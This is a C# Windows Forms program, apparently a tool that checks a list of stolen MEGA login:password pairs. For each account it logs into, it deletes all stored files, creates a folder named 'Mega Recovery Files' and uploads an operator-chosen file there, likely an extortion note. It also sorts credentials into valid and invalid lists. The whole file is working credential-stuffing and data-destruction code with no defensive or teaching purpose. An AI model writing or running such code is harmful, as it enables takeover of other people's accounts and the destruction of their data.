using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.IO;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using CG.Web.MegaApiClient;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using static SeleniumLib.simple;
using KEYS = OpenQA.Selenium.Keys;

namespace app4
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        

        private void button1_Click(object sender, EventArgs e)
        {
            string[] passlog = File.ReadAllLines(textBox2.Text);
            foreach (string line in passlog)
            {
                string[] logpass = line.Split(new char[] { ':' });
                bool valid = delAll(logpass[0], logpass[1]);
                if (valid)
                {
                    StreamWriter writer = File.AppendText("valid.txt");
                    writer.WriteLine(logpass[0] + ":" + logpass[1]);
                    writer.Close();
                } else {
                    StreamWriter writer = File.AppendText("invalid.txt");
                    writer.WriteLine(logpass[0] + ":" + logpass[1]);
                    writer.Close();
                }
            }
            richTextBox2.Clear();
            richTextBox2.AppendText("Done!\n");
        }

        private void richTextBox3_TextChanged(object sender, EventArgs e)
        {

        }
        public bool delAll(string login, string password)
        {
            MegaApiClient client = new MegaApiClient();
            try
            {
                client.Login(login, password);
                // Удаление всего содержимого
                foreach (var node in client.GetNodes())
                {
                    try
                    {
                        client.Delete(node, false);
                    }
                    catch (Exception ex) { };
                }
                // Загрузка на диск
                IEnumerable<INode> nodes = client.GetNodes();

                INode root = nodes.Single(x => x.Type == NodeType.Root);
                INode myFolder = client.CreateFolder("Mega Recovery Files", root);

                INode myFile = client.UploadFile(textBox1.Text, myFolder);

                client.Logout();
                return true;
            }
            catch (Exception ex) { return false; };
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click_1(object sender, EventArgs e)
        {

        }
    }
}
